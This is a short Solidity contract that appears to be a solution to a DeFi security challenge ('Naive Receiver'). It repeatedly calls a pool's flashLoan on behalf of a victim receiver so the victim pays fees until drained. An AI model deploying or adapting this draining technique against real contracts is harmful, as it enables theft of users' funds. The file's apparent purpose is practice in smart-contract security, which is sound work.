// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract NaiveReceiverAttacker {
    IPool pool;

    constructor(address payable _poolAddress) public {
        pool = IPool(_poolAddress);
    }

    function attack(address victim) external {
        for (uint i; i < 10; i++) {
            pool.flashLoan(victim, 0);
        }
    }
}
